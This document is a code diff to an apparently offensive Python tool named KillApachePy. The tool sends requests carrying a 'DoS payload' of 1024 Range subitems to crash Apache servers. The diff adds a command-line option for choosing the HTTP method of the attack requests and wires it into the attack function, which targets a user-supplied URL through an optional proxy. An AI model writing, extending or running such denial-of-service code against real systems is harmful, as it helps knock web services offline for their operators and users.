@@ -13,7 +13,7 @@ SLEEP_TIME      = 3     # time to wait for new thread slots (after max number re
 RANGE_NUMBER    = 1024  # number of range subitems forming the DoS payload
 USER_AGENT      = "KillApachePy (%s)" % VERSION
 
-def attack(url, user_agent=None, proxy=None):
+def attack(url, user_agent=None, method='HEAD', proxy=None):
     if '://' not in url:
         url = "http://%s" % url
 
@@ -49,7 +49,7 @@ def attack(url, user_agent=None, proxy=None):
         try:
             headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload, 'Accept-Encoding': 'gzip' }
             req = _MethodRequest(url, None, headers)
-            req.set_method('HEAD')
+            req.set_method(method)
             response = urllib2.urlopen(req)
             if check:
                 return response and ('byteranges' in repr(response.headers.headers) or response.code == 206)
@@ -99,10 +99,11 @@ def main():
     parser = optparse.OptionParser(version=VERSION)
     parser.add_option("-u", dest="url", help="Target url (e.g. \"http://www.target.com/index.php\")")
     parser.add_option("--agent", dest="agent", help="User agent (e.g. \"Mozilla/5.0 (Linux)\")")
+    parser.add_option("--method", dest="method", default='HEAD', help="HTTP method used (default: HEAD)")
     parser.add_option("--proxy", dest="proxy", help="Proxy (e.g. \"http://127.0.0.1:8118\")")
     options, _ = parser.parse_args()
     if options.url:
-        result = attack(options.url, options.agent, options.proxy)
+        result = attack(options.url, options.agent, options.method, options.proxy)
     else:
         parser.print_help()
 
